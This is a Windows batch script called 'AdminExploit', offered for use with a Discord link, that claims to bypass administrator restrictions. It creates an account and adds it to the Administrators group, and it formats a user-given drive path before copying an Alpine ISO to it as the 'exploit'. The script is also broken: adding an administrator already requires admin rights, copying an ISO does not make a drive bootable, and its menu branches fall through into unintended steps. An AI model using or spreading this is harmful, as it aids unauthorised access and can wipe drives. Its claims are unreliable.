:start 
cls
@echo off
color 0a
title AdminExploit $ Mattix_off
echo.
echo ===========================
echo.
echo -- Welcome to AdminExploit
echo -- This is a batch script to bypass admin privileges.
echo -- Want help? Join our Discord: https://dsc.gg/novantasbunker
echo.
timeout /t 5 /nobreak >nul
goto :menu

:menu
cls
echo. 
echo ===========================
echo.
echo -- AdminExploit Menu
echo 1. -- Run this if you have booted the usb
echo 2. -- Run this to create an account and give it adminstator privileges
echo 3. -- Run this to create a ready bootable USB with the exploit
echo help - show the tutorial
echo exit - well, this explain itself
echo.
set /p choice="root@AdminExploit: "

if "%choice%"=="1" goto :runusb
if "%choice%"=="2" goto :createaccount
if "%choice%"=="3" goto :createusb
if "%choice%"=="help" goto :help
if "%choice%"=="exit" exit
goto :menu

:runusb
cls
echo Insert the USB drive path below.
echo Make sure the USB drive is connected and accessible.
set /p usb_path="USB Path: "
if not exist "%usb_path%\" (
    echo The specified path does not exist. Please check the USB drive.
    pause
    goto :menu
)
echo Running exploit on USB...
echo This will format the USB drive and copy necessary files.

format %usb_path% /fs:NTFS /q /v:USB /x
if errorlevel 1 (
    echo The formatting failed. Please check the USB drive.
    pause
    goto :menu
) else (
    echo The formatting was successful.
    timeout /t 2 >nul
)

copy /y alpine.iso "%usb_path%\"
if errorlevel 1 (
    echo Failed to copy files to the USB drive. Please check the USB drive.
    pause
    goto :menu
) else (
    echo Files copied successfully to the USB drive.
)
echo.
echo Done! You can now boot from the USB drive.

:createaccount
cls
echo Creating a new Administrator account...
set /p username="Enter the username for the new account: "
set /p password="Enter the password for the new account: "
net user "%username%" "%password%" /add
if errorlevel 1 (
    echo Failed to create the account. Please check the username and password.
    pause
    goto :menu
) else (
    echo Account created successfully.
)
net localgroup Administrators "%username%" /add
if errorlevel 1 (
    echo Failed to add the account to the Administrators group.
    pause
    goto :menu
) else (
    echo The account has been added to the Administrators group successfully.
)
echo.
echo Done! You can now log in with the new account.

:createusb
cls
echo Insert the USB drive path below.
echo Make sure the USB drive is connected and accessible.
echo.
echo IMPORTANT: This will format the USB drive and copy necessary files.
echo Make sure to back up any important data on the USB drive before proceeding.
echo.
set /p usb_path="USB Path: "
if not exist "%usb_path%\" (
    echo The specified path does not exist. Please check the USB drive.
    pause
    goto :menu
)
echo Running exploit on USB...
echo This will format the USB drive and copy necessary files.

format %usb_path% /fs:NTFS /q /v:USB /x
if errorlevel 1 (
    echo The formatting failed. Please check the USB drive.
    pause
    goto :menu
) else (
    echo The formatting was successful.
    timeout /t 2 >nul
)

copy /y alpine.iso "%usb_path%\"
if errorlevel 1 (
    echo Failed to copy files to the USB drive. Please check the USB drive.
    pause
    goto :menu
) else (
    echo Files copied successfully to the USB drive.
)
echo.
echo Done! You can now boot from the USB drive.

:help
cls
echo.
echo Thi is the tutorial
echo.
notepad tutorial.txt
pause
goto :menu

:exit
cls
echo.
echo Exiting AdminExploit...
echo.
timeout /t 2 >nul
exit